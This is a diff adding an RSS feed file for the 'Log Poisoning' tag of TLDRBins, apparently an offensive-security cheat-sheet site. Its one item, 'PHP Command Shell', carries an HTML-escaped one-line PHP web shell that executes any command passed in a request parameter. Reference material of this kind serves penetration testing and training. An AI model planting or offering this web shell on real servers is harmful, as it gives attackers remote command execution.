@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Log Poisoning on TLDRBins</title>
+    <link>https://tldrbins.github.io/@log-poisoning/</link>
+    <description>Recent content in Log Poisoning on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@log-poisoning/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PHP Command Shell</title>
+      <link>https://tldrbins.github.io/php_cmd_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
+      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
